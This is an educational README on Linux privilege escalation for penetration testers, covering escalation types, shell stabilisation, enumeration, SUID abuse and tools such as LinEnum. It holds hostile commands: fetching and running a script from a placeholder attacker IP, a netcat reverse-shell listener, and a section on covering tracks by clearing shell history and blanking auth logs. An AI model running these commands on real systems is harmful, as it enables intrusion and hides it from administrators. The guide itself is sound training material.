Here's a detailed README file on privilege escalation for penetration testers. This guide takes you step-by-step through the fundamentals of privilege escalation, its types, methods, examples, and practical demonstrations. It includes real-world scenarios, examples, and commands to help solidify your understanding.

---

# Privilege Escalation for Pentesters

## Table of Contents

1. [Getting Started](#1-getting-started)
2. [Learning Objectives](#2-learning-objectives)
3. [Understanding Privilege Escalation](#3-understanding-privilege-escalation)
   - [Horizontal Privilege Escalation](#31-horizontal-privilege-escalation)
   - [Vertical Privilege Escalation](#32-vertical-privilege-escalation)
4. [Reinforcing the Breach](#4-reinforcing-the-breach)
5. [Enumeration After Initial Access](#5-enumeration-after-initial-access)
6. [Privilege Escalation Checklist](#6-privilege-escalation-checklist)
7. [Understanding and Abusing SUID](#7-understanding-and-abusing-suid)
8. [Using Enumeration Scripts](#8-using-enumeration-scripts)
9. [Covering Your Tracks](#9-covering-your-tracks)
10. [Practical Challenge](#10-practical-challenge)

---
## 2. Learning Objectives

In this guide, we'll cover the following:

- Fundamentals of privilege escalation: what it is and how it works.
- Basics of Linux file permissions and why privilege escalation is crucial for pentesters.
- Practical application of abusing file permission misconfigurations on Linux systems.
- Using real-world tools and techniques to escalate privileges in controlled environments.

---

## 3. Understanding Privilege Escalation

Privilege escalation is the process of gaining higher-level permissions than initially granted. It involves either moving laterally to access another user's resources (horizontal) or moving upward to gain administrative or root-level privileges (vertical).

### 3.1. Horizontal Privilege Escalation

- **Definition**: Using the legitimate permissions of a user to exploit a vulnerability and access another user's resources with similar privileges.
- **Example**: An accounting user accesses HR documents by exploiting a misconfiguration or vulnerability. Here, both users have similar privileges, and the attacker is not moving to a higher privilege level.
- **Real-World Scenario**: Suppose a web application allows users to view documents by appending document IDs to a URL. A user from one department guesses the IDs of documents belonging to another department and gains unauthorized access.

### 3.2. Vertical Privilege Escalation

- **Definition**: Exploiting a vulnerability to perform actions as a higher-privileged user, like an administrator.
- **Example**: On "Day 1 - A Christmas Crisis", modifying cookies to access an admin control panel from a standard user account is a perfect example.
- **Real-World Scenario**: A non-privileged user on a Windows machine uses a local exploit (e.g., CVE-2021-34527, PrintNightmare) to gain SYSTEM privileges.

---

## 4. Reinforcing the Breach

After gaining initial access, maintaining stability is crucial. Some exploits can cause instability or crashes (e.g., **EternalBlue**). To stabilize a connection after exploiting a vulnerability:

1. **Spawn a More Interactive Shell**:
   - Use Python to upgrade the shell:  
     ```bash
     python -c 'import pty; pty.spawn("/bin/bash")'
     ```
   - This converts a basic shell (like `/bin/sh`) to an interactive shell (`/bin/bash`), enabling functionalities like tab-completion.

2. **Reverse Shell Connection**:
   - Exploit a vulnerability (e.g., command injection) to get a reverse shell.
   - Use `netcat` to connect back to your machine:
     ```bash
     nc -lvnp 4444
     ```

---

## 5. Enumeration After Initial Access

**Enumeration** is the process of gathering information about the internal environment after gaining access.

- **Key Targets for Enumeration**:
  - Running services
  - Sensitive files (e.g., `/etc/passwd`, `.bash_history`)
  - Configuration files with credentials
  - SUID binaries that can be exploited
  - Uncommon or weak permissions

- **Useful Commands**:
  - Search for files with specific names:  
    ```bash
    find / -name "id_rsa" 2>/dev/null
    ```
  - Search for SUID binaries:  
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```

---

## 6. Privilege Escalation Checklist

When looking for vulnerabilities to escalate privileges, use a systematic approach:

1. **Determine the Kernel Version**:  
   - Exploit known vulnerabilities like DirtyCOW.
   
2. **Check for Running Services or Applications**:  
   - Identify outdated or vulnerable software (e.g., SUID binaries).
   
3. **Inspect Automated Scripts**:  
   - Crontabs or backup scripts can often be abused.
   
4. **Look for Misconfigured File Permissions**:  
   - World-writable files or directories may allow overwriting sensitive scripts or binaries.
   
5. **Find Credentials in Config Files or Memory**:  
   - Use tools like `grep` to search for `password` or `secret` keywords in `/etc` or other common locations.

**Recommended Checklists**:
- [g0tmi1k's Privilege Escalation Guide](https://github.com/g0tmi1k)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 7. Understanding and Abusing SUID

### What is SUID?

- **SUID (Set User ID)** is a special file permission for executables that allows users to execute a file with the permissions of the file's owner.
- **Example**: `/usr/bin/passwd` uses SUID to allow users to change their passwords.

### Abusing SUID Permissions

1. **Finding SUID Binaries**:  
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Practical Example**:  
   - Set the SUID on the `cp` command:  
     ```bash
     chmod u+s /usr/bin/cp
     ```
   - Now `cp` will run as `root`, allowing users to copy files they normally couldn't.

3. **GTFOBins**:  
   - A helpful resource that lists commands and techniques to exploit SUID binaries. Visit [GTFOBins](https://gtfobins.github.io/) for a complete list of exploitable binaries.

---

## 8. Using Enumeration Scripts

Enumeration scripts automate much of the grunt work involved in identifying misconfigurations:

1. **LinEnum**:
   - A popular script that scans for kernel exploits, SUID files, running services, etc.
   - **Download and Use**:
     ```bash
     wget http://<Your-IP>:8080/LinEnum.sh
     chmod +x LinEnum.sh
     ./LinEnum.sh
     ```

2. **Other Useful Scripts**:
   - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Advanced enumeration script.
   - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester): Identifies possible exploits based on the kernel version.

---

## 9. Covering Your Tracks

After a successful exploit, covering your tracks is essential to avoid detection:

- **Log Locations to Monitor**:
  - `/var/log/auth.log` – SSH and authentication logs.
  - `/var/log/syslog` – System events and potential firewall alerts.
  - Service-specific logs (e.g., Apache access logs `/var/log/apache2/access.log`).

- **Remove Evidence**:
  - **Clear Shell History**:
    ```bash
    history -c
    ```
  - **Overwrite Log Entries** (Requires root):
    ```bash
    echo "" > /var/log/auth.log
    ```

